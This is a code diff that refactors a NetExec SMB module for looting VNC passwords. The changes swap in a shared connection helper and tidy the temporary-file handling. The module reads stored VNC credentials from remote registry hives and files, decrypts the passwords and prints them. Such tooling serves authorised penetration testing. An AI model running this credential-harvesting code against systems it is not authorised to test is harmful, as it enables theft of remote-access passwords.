@@ -1,6 +1,5 @@
 import ntpath
 import tempfile
-from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target
 
 from impacket.dcerpc.v5 import rrp
@@ -13,6 +12,8 @@ from binascii import unhexlify
 import codecs
 import re
 
+from nxc.protocols.smb.dpapi import upgrade_to_dploot_connection
+
 
 class NXCModule:
     """
@@ -23,8 +24,6 @@ class NXCModule:
     name = "vnc"
     description = "Loot Passwords from VNC server and client configurations"
     supported_protocols = ["smb"]
-    opsec_safe = True
-    multiple_hosts = True
 
     def __init__(self, context=None, module_options=None):
         self.context = context
@@ -51,7 +50,7 @@ class NXCModule:
         self.connection = connection
         self.share = self.connection.args.share
 
-        host = connection.hostname + "." + connection.domain
+        host = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
         domain = connection.domain
         username = connection.username
         kerberos = connection.kerberos
@@ -73,21 +72,13 @@ class NXCModule:
             use_kcache=use_kcache,
         )
 
-        dploot_conn = self.upgrade_connection(target=target, connection=connection.conn)
+        dploot_conn = upgrade_to_dploot_connection(target=target, connection=connection.conn)
         if not self.no_remoteops:
             remote_ops = RemoteOperations(connection.conn, False)
             remote_ops.enableRegistry()
             self.vnc_from_registry(remote_ops)
             self.vnc_client_proxyconf_extract(dploot_conn, remote_ops)
         self.vnc_from_filesystem(dploot_conn)
-
-    def upgrade_connection(self, target: Target, connection=None):
-        conn = DPLootSMBConnection(target)
-        if connection is not None:
-            conn.smb_session = connection
-        else:
-            conn.connect()
-        return conn
 
     def reg_query_value(self, remote_ops, path, key, hku=False):
         if remote_ops._RemoteOperations__rrp:
@@ -135,17 +126,17 @@ class NXCModule:
                             self.context.log.debug(f"Error while RegQueryValues {registry_keys} from {user_registry_path}: {e}")
                         continue
                 else:
-                    fh = tempfile.NamedTemporaryFile()
-                    fh.write(ntuser_dat_bytes)
-                    fh.seek(0)
-                    reg = winregistry.Registry(fh.name, isRemote=False)
-                    parent_key = reg.findKey(registry_path)
-                    if parent_key is None:
-                        continue
-                    cred["user"] = reg.getValue(ntpath.join(registry_path, registry_keys[0]))[1].decode("latin-1")
-                    password = reg.getValue(ntpath.join(registry_path, registry_keys[1]))[1].decode("utf-16le").rstrip("\0").encode()
-                    cred["password"] = self.recover_vncpassword(unhexlify(password)).decode("latin-1")
-                    cred["server"] = reg.getValue(ntpath.join(registry_path, registry_keys[2]))[1].decode("latin-1")
+                    with tempfile.NamedTemporaryFile() as fh:
+                        fh.write(ntuser_dat_bytes)
+                        fh.seek(0)
+                        reg = winregistry.Registry(fh.name, isRemote=False)
+                        parent_key = reg.findKey(registry_path)
+                        if parent_key is None:
+                            continue
+                        cred["user"] = reg.getValue(ntpath.join(registry_path, registry_keys[0]))[1].decode("latin-1")
+                        password = reg.getValue(ntpath.join(registry_path, registry_keys[1]))[1].decode("utf-16le").rstrip("\0").encode()
+                        cred["password"] = self.recover_vncpassword(unhexlify(password)).decode("latin-1")
+                        cred["server"] = reg.getValue(ntpath.join(registry_path, registry_keys[2]))[1].decode("latin-1")
 
                 self.context.log.highlight(f"[{vnc_name}] {cred['user']}:{cred['password']}@{cred['server']}")
 
